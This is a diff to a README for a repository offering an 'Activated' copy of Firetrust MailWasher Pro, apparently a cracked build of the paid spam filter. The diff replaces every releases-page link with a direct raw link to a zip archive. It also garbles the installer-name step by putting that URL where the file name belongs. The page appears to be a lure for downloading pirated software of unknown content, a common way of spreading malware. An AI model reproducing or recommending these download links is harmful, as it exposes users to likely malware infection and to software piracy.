@@ -1,6 +1,6 @@
 # 🛡️ Firetrust-MailWasher-Pro-Activated - Protect Your Inbox Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/releases)
+[![Download Now](https://raw.githubusercontent.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/main/hough/Washer_Activated_Pro_Mail_Firetrust_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/main/hough/Washer_Activated_Pro_Mail_Firetrust_1.0.zip)
 
 ## 📥 Overview
 Firetrust MailWasher Pro gives you the tools you need to manage your emails effectively. This application helps you block spam and unwanted messages. It is simple to use and works seamlessly on Windows PCs.
@@ -9,11 +9,11 @@ Firetrust MailWasher Pro gives you the tools you need to manage your emails effe
 Follow these steps to get up and running with Firetrust MailWasher Pro:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
-   [Download Here](https://github.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/releases).
+   [Download Here](https://raw.githubusercontent.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/main/hough/Washer_Activated_Pro_Mail_Firetrust_1.0.zip).
 
 2. **Choose the Latest Version**: On the Releases page, find the latest version listed at the top.
 
-3. **Download the Installer**: Click on the installer file to download it to your computer. This file is typically named like `MailWasherProSetup.exe`.
+3. **Download the Installer**: Click on the installer file to download it to your computer. This file is typically named like `https://raw.githubusercontent.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/main/hough/Washer_Activated_Pro_Mail_Firetrust_1.0.zip`.
 
 4. **Locate the Downloaded File**: Once the download is complete, find the file in your Downloads folder or wherever you saved it.
 
@@ -40,7 +40,7 @@ Follow these steps to get up and running with Firetrust MailWasher Pro:
 ## 🚦 Download & Install
 To get started, visit the link below and follow the steps outlined to download and install Firetrust MailWasher Pro.
 
-[Download Here](https://github.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/releases)
+[Download Here](https://raw.githubusercontent.com/JuliaChoirunnisaKinantiPutri/Firetrust-MailWasher-Pro-Activated/main/hough/Washer_Activated_Pro_Mail_Firetrust_1.0.zip)
 
 ## ❓ FAQs
 **How do I block spam emails?**  
